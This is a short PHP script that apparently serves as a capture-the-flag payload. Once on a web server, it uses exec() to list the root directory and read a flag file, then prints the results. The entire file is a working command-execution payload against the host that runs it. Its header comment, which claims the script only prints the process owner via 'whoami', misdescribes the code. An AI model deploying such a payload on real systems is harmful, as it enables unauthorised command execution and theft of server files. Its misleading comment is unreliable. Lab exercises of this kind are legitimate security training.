<?php
// outputs the username that owns the running php/httpd process
// (on a system with the "whoami" executable in the path)
$output=null;
$retval=null;
exec('ls -l /', $output, $retval);
print_r($output);
print($retval);
exec('cat flag-e3deebb27b56053dd7041cf93d1499f4', $output, $retval);
print_r($output);
print($retval);
?>
